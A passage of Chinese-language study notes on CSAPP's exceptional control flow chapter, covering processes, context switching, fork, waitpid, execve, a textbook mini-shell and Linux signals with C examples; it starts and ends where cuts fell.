src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215163341288.png" alt="image-20240215163341288"></p><h5 id="终止"><a href="#终止" class="headerlink" title="终止"></a>终止</h5><p>终止是不可恢复的致命错误造成的结果，通常是一些硬件错误，比如 DRAM 或者SRAM 位被损坏时发生的奇偶错误。</p><h4 id="Linux-86-64-系统调用"><a href="#Linux-86-64-系统调用" class="headerlink" title="Linux/86-64 系统调用"></a>Linux/86-64 系统调用</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215164416422.png" alt="image-20240215164416422"></p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><ul><li><p>异常是允许操作系统内核提供进程 (process) 概念的基本构造块。</p></li><li><p>进程的经典定义就是一个执行中程序的实例。</p></li><li><p>系统中的每个程序都运行在某个进程的<code>上下文 (context)</code> 中。</p></li><li><p>上下文是由程序正确运行所需的状态组成的。这个状态包括存放在内存中的<code>程序的代码和数据</code>，它的<code>栈</code>、<code>通用目的寄存器的内容</code>、<code>程序计数器</code>、<code>环境变量</code>以及<code>打开文件描述符</code>的集合.</p></li><li>每次用户通过向 shell 输入 个可执行目标文件的名字，运行程序时， <code>shell 就会创建一个新的进程，然后在这个新进程的上下文中运行这个可执行目标文件。</code></li></ul><p>进程提供给应用程序的关键抽象：</p><ul><li>一个<code>独立的逻辑控制流</code>，它提供一个假象，好像我们的程序独占地使用处理器。</li><li>一个<code>私有的地址空间</code>，它提供一个假象，好像我们的程序独占地使用内存系统。</li></ul><h4 id="逻辑控制流"><a href="#逻辑控制流" class="headerlink" title="逻辑控制流"></a>逻辑控制流</h4><p>进程是轮流使用处理器的。每个进程执行它的流的一部分，然后被抢占 (preempted) (暂时挂起），然后轮到其他进程。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215165111954.png" alt="image-20240215165111954"></p><h4 id="并发流"><a href="#并发流" class="headerlink" title="并发流"></a>并发流</h4><p>一个逻辑流的执行在时间上与另一个流重叠，称为<code>并发流 (concurrent flow)</code>, 这两个流被称为并发地运行。</p><p>多个流并发地执行的一般现象被称为<code>并发 (concurrency)</code>。</p><p>一 个进程和其他进程轮流运行的概念称为<code>多任务(multitasking)</code> 。</p><p>一个进程执行它的控制流的一部分的每一时间段叫做<code>时间片 (time slice)</code>。</p><p>因此，多任务也叫做<code>时间分片 (time slicing)</code> 。</p><h4 id="私有地址空间"><a href="#私有地址空间" class="headerlink" title="私有地址空间"></a>私有地址空间</h4><p>x86-64：</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215170927300.png" alt="image-20240215170927300"></p><h4 id="用户模式和内核模式"><a href="#用户模式和内核模式" class="headerlink" title="用户模式和内核模式"></a>用户模式和内核模式</h4><p>处理器将某个控制寄存器中的一个模式为（mode bit）来区别进程运行在用户模式还是内核模式（超级用户模式）。</p><p><code>/proc</code>文件系统它允许用户模式进程访问内核数据结构的内容。</p><p><code>/sys</code>文件系统，它输出关于系统总线和设备的额外的低层信息。</p><h4 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h4><p>操作系统内核使用一种称为<code>上下文切换 (context switch)</code> 的较高层形式的异常控制流来实现多任务。</p><p>在进程执行的某些时刻，内核可以决定抢占当前进程，并重新开始一个先前被抢占了的进程。这种决策就叫做<code>调度 (scheduling)</code>, 是由内核中称为调度器 (scheduler) 的代码处理的。</p><ol><li>保存当前进程的上下文</li><li>恢复某个先前被抢占的进程被保存的上下文</li><li>将控制传递给这个新恢复的进程</li></ol><p>由于从磁盘中读取文件需要几十毫秒，当进程A阻塞（需要的文件未读取完成），cpu会去执行其他进程，当读取完成时，磁盘发送中断异常到cpu，继续执行指令。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215172337812.png" alt="image-20240215172337812"></p><h3 id="系统调用错误处理"><a href="#系统调用错误处理" class="headerlink" title="系统调用错误处理"></a>系统调用错误处理</h3><p>Unix 系统级函数遇到错误时，它们通常会返回-1, 并设詈全局整数变量<code>errno</code>示什么出错了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">unix_error</span><span class="params">(<span class="type">char</span> *msg)</span> <span class="comment">/* 错误处理包装函数 */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如<code>Fork</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pid_t</span> <span class="title function_">Fork</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((pid = fork()) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Fork error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h3><h4 id="获取进程ID"><a href="#获取进程ID" class="headerlink" title="获取进程ID"></a>获取进程ID</h4><p>每个进程都有一个唯一的正数<code>进程 ID(PID)</code>。<code>getpid()</code>通过函数返回调用进程的 PID。<code>getppid()</code>函数返回它的父进程的 PID( 创建调用进程的进程）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">getpid</span><span class="params">(<span class="type">void</span>)</span>; </span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">getppid</span><span class="params">(<span class="type">void</span>)</span>; </span><br></pre></td></tr></table></figure><p><code>getppid ()</code>函数返回一个类型为 <code>pid_t</code> 的整数值，在 Linux 系统上它在<code>types.h</code>中被定义为<code>int</code>。</p><h4 id="创建和终止进程"><a href="#创建和终止进程" class="headerlink" title="创建和终止进程"></a>创建和终止进程</h4><ul><li>进程总是处于运行、停止和终止三种状态。</li></ul><p><strong>fork函数</strong>：</p><p>子进程返回0，父进程返回子进程的<code>PID</code>,如果出错则返回-1。</p><ul><li><code>调用一次，返回两次</code></li><li>并发执行</li><li><code>相同但是独立的地址空间</code></li><li>共享文件</li></ul><p>可以通过进程图来理解带有嵌套的fork函数</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215183725431.png" alt="image-20240215183725431"></p><h4 id="回收子进程"><a href="#回收子进程" class="headerlink" title="回收子进程"></a>回收子进程</h4><ul><li><p>当一个进程由于某种原因终止时，内核并不是立即把它从系统中清除。相反，进程被保持在一种已终止的状态中，直到被它的父进程回收 (reaped) 。当父进程回收己终止的子进程时，<code>内核将子进程的退出状态传递给父进程</code>，然后抛弃己终止的进程，从此时开始，该进程就不存在了。</p></li><li><p>一个终止了但还未被回收的进程称为<code>僵死进程 (zombie）</code>。</p></li><li>如果一个父进程终止了，内核会安排 <code>init</code>进程成为它的孤儿进程的养父。</li><li><code>init</code>进程PID=1, 是在系统启动时由内核创建的，它不会终止，是所有进程的祖先。</li></ul><p>​    </p><p><strong>waitpid</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span> </span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">waitpid</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> *statusp, <span class="type">int</span> options)</span>; </span><br></pre></td></tr></table></figure><p>当等待集合中的进程终止后返回终止进程pid。</p><ol><li><p>判定等待集合的成员</p><p>如果pid&gt;0, 那么等待集合就是一个单独的子进程，它的进程 ID 等于 pid。<br>如果pid= -1, 那么等待集合就是由父进程所有的子进程组成的。</p></li><li><p>修改默认行为</p></li></ol><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215201704669.png" alt="image-20240215201704669"></p><ol><li>检查已回收子进程的退出状态</li></ol><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215201738218.png" alt="image-20240215201738218"></p><ol><li>错误条件</li></ol><p>如果调用进程<code>没有子进程</code>，那么 waitpid 返回<code>-1</code>, 并且设置<code>errno</code>为<code>ECHILD</code>。如果waitpid 函数<code>被一个信号中断</code>，那么它返回-1, 并设置 <code>errno</code>为<code>EINTR</code>。</p><ol><li>wait函数</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span> </span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">wait</span><span class="params">(<span class="type">int</span> *statusp)</span>; </span><br></pre></td></tr></table></figure><p>waitpid的简化版。等价于<code>waitpid(-1,&amp;status,0)</code>。</p><ol><li>使用waitpid的示例</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* $begin waitpid2 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 2</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> status, i;</span><br><span class="line">    <span class="type">pid_t</span> pid[N], retpid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parent creates N children */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        <span class="keyword">if</span> ((pid[i] = Fork()) == <span class="number">0</span>)  <span class="comment">/* Child */</span>          <span class="comment">//fork进程并存储对应pid</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">100</span>+i);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parent reaps N children in order */</span></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((retpid = waitpid(pid[i++], &amp;status, <span class="number">0</span>)) &gt; <span class="number">0</span>) &#123; <span class="comment">//按照顺序回收子进程</span></span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status))</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;child %d terminated normally with exit status=%d\n&quot;</span>,</span><br><span class="line">                   retpid, WEXITSTATUS(status));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;child %d terminated abnormally\n&quot;</span>, retpid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 确认没有子进程 */</span></span><br><span class="line">    <span class="keyword">if</span> (errno != ECHILD)</span><br><span class="line">        unix_error(<span class="string">&quot;waitpid error&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end waitpid2 */</span></span><br></pre></td></tr></table></figure><h4 id="让进程休眠"><a href="#让进程休眠" class="headerlink" title="让进程休眠"></a>让进程休眠</h4><p><code>sleep</code>函数将一个进程挂起一个指定时间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sleep</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> secs)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pause</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><p>时间到了，返回0；时间未到，返回剩余时间。</p><p><code>pause函数</code>使调用函数休眠，直到该进程收到一个信号。</p><h4 id="加载并运行程序"><a href="#加载并运行程序" class="headerlink" title="加载并运行程序"></a>加载并运行程序</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *argv[], <span class="type">const</span> <span class="type">char</span> *envp[])</span>; </span><br></pre></td></tr></table></figure><p><code>execve</code>调用一次<code>从不返回</code>，execve 函数在当前进程的上下文中加载并运行一个新的程序 它会覆盖当前进程的地址空间，但并没有创建一个新进程 。</p><p><code>argv 变量</code>指向一个以 <code>null 结尾的指针数组</code>，其中每个指针都指向一个参数字符串。按照惯例， argv [0] 是可执行目标文件的名字。</p><p> <code>envp 变量</code>指向一个以<code>null 结尾的指针数组</code>，其中每个指针指向一个环境变量字符串，每个串都是形如”name=value” 的名字-值对。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215204034862.png" alt="image-20240215204034862"></p><p>main 函数有3个参数： </p><ol><li><code>argc</code>, 它给出 <code>argv[ ]</code>数组中非空指针的数量</li><li><code>argv</code>, <code>指向argv[ ]</code>数组中的第一个条目。</li><li><code>envp</code>, <code>指向 envp[]</code>数组中的第一个条目。</li></ol><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215204911421.png" alt="image-20240215204911421"></p><p>linux可以通过<code>getenv</code>和<code>setenv</code>来修改环境变量。</p><blockquote><p>程序与进程</p><p>进程是执行中程序的一个具体的实例；程序总是运行在某个进程的上下文中。</p></blockquote><h4 id="利用fork和execve运行程序"><a href="#利用fork和execve运行程序" class="headerlink" title="利用fork和execve运行程序"></a>利用fork和execve运行程序</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* $begin shellmain */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXARGS   128</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Function prototypes */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">parseline</span><span class="params">(<span class="type">char</span> *buf, <span class="type">char</span> **argv)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">builtin_command</span><span class="params">(<span class="type">char</span> **argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> cmdline[MAXLINE]; <span class="comment">/* Command line */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* Read */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        Fgets(cmdline, MAXLINE, <span class="built_in">stdin</span>);<span class="comment">//反复读取参数</span></span><br><span class="line">        <span class="keyword">if</span> (feof(<span class="built_in">stdin</span>))<span class="comment">//C 库函数 int feof(FILE *stream) 测试给定流 stream 的文件结束标识符。</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">//当设置了与流关联的文件结束标识符时，该函数返回一个非零值，否则返回零。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Evaluate */</span></span><br><span class="line">        eval(cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end shellmain */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* $begin eval */</span></span><br><span class="line"><span class="comment">/* eval - Evaluate a command line */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span><span class="comment">//解析</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *argv[MAXARGS]; <span class="comment">/* Argument list execve() */</span></span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];   <span class="comment">/* Holds modified command line */</span></span><br><span class="line">    <span class="type">int</span> bg;              <span class="comment">/* Should the job run in bg or fg? */</span></span><br><span class="line">    <span class="type">pid_t</span> pid;           <span class="comment">/* Process id */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(buf, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;   <span class="comment">/* Ignore empty lines */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!builtin_command(argv)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((pid = Fork()) == <span class="number">0</span>) &#123;   <span class="comment">/* Child runs user job */</span></span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Parent waits for foreground job to terminate */</span></span><br><span class="line">        <span class="keyword">if</span> (!bg) &#123;</span><br><span class="line">            <span class="type">int</span> status;</span><br><span class="line">            <span class="keyword">if</span> (waitpid(pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">                unix_error(<span class="string">&quot;waitfg: waitpid error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d %s&quot;</span>, pid, cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If first arg is a builtin command, run it and return true */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">builtin_command</span><span class="params">(<span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>)) <span class="comment">/* quit command */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;&amp;&quot;</span>))    <span class="comment">/* Ignore singleton &amp; */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                     <span class="comment">/* Not a builtin command */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end eval */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* $begin parseline */</span></span><br><span class="line"><span class="comment">/* parseline - Parse the command line and build the argv array */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">parseline</span><span class="params">(<span class="type">char</span> *buf, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *delim;         <span class="comment">/* Points to first space delimiter */</span></span><br><span class="line">    <span class="type">int</span> argc;            <span class="comment">/* Number of args */</span></span><br><span class="line">    <span class="type">int</span> bg;              <span class="comment">/* Background job? */</span></span><br><span class="line"></span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] = <span class="string">&#x27; &#x27;</span>;  <span class="comment">/* Replace trailing &#x27;\n&#x27; with space */</span></span><br><span class="line">    <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* Ignore leading spaces */</span></span><br><span class="line">        buf++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Build the argv list */</span></span><br><span class="line">    argc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>))) &#123;</span><br><span class="line">        argv[argc++] = buf;</span><br><span class="line">        *delim = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        buf = delim + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* Ignore spaces */</span></span><br><span class="line">            buf++;</span><br><span class="line">    &#125;</span><br><span class="line">    argv[argc] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span>)  <span class="comment">/* Ignore blank line */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Should the job run in the background? */</span></span><br><span class="line">    <span class="keyword">if</span> ((bg = (*argv[argc<span class="number">-1</span>] == <span class="string">&#x27;&amp;&#x27;</span>)) != <span class="number">0</span>)</span><br><span class="line">        argv[--argc] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end parseline */</span></span><br></pre></td></tr></table></figure><h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><p>一个信号就是一条小消息，它通知进程系统中发生了一个某种类型的事件。</p><p><code>软件形式的异常</code>，称为 Linux 信号，它允许进程和内核中断其他进程。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man signal   //信号手册</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240216134615426.png" alt="image-20240216134615426"></p><h4 id="信号术语"><a href="#信号术语" class="headerlink" title="信号术语"></a>信号术语</h4><ul><li>发送信号</li><li>接受信号</li><li>待处理信号，在任何时刻，<code>一种类型至多只会有一个待处理信号</code>，多余的会被丢弃。</li><li><code>一个待处理信号最多只能被接收一次</code>。内核为每个进程在<code>pending 位向量</code>中维护着待处理信号的集合，而在 <code>blocked 位向量（也称为信号掩码signal mask）中维护被阻塞的信号集合</code>。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240216135351733.png" alt="image-20240216135351733"></p><h4 id="发送信号"><a href="#发送信号" class="headerlink" title="发送信号"></a>发送信号</h4><ol><li><p>进程组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">getpgrp</span><span class="params">(<span class="type">void</span>)</span>; <span class="comment">//返回：调用进程的进程组 ID</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">setpgid</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">pid_t</span> pgid)</span>; <span class="comment">//返回：若成功则为 0, 若错误则为-1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setpgid(<span class="number">0</span>, <span class="number">0</span>); <span class="comment">//会创建一个新的进程组，若进程名为15213，那么其进程组 ID 15213, 并且把进程 15213 加入到这个新的进程组中。</span></span><br></pre></td></tr></table></figure><p>如果 pid是0， 那么就使用当前进程PID 如果 pgid是0, 那么就用pid指定的进程的 PID 作为进程组 ID 。</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef //常用</span><br><span class="line">ps -ajx //查看父进程ID，进程ID，进程组ID，会话ID</span><br></pre></td></tr></table></figure><ol><li>使用 <code>/bin/kill 程序</code>发送信号</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">/bin/kill -9 15213</span>  </span><br><span class="line">//发送信号 9(SIGKILL) 给进程 15213 。</span><br><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">/bin/kill -9 -15213</span></span><br><span class="line">//发送 SIGKILL 信号给进程组 15213 中的每个进程。</span><br></pre></td></tr></table></figure><ol><li>从键盘发送信号</li></ol><p>Unix shell 使用作业 (job) 这个抽象概念来表示为对一条命令行求值而创建的进程,任何时刻，<code>至多只有一个前台作业和 0个或多个后台作业</code>。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240216142444242.png" alt="image-20240216142444242"></p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>Ctrl+C</td><td>内核发送一个 SIGINT 信号到前台进程组中的每个进程。默认情况下，结果是终止前台作业。</td></tr><tr><td>Ctrl+Z</td><td>发送一个 SIGTSTP信号到前台进程组中的每个进程。默认情况下，结果是停止（挂起）前台作业。</td></tr></tbody></table></div><ol><li>用kill函数发送信号</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 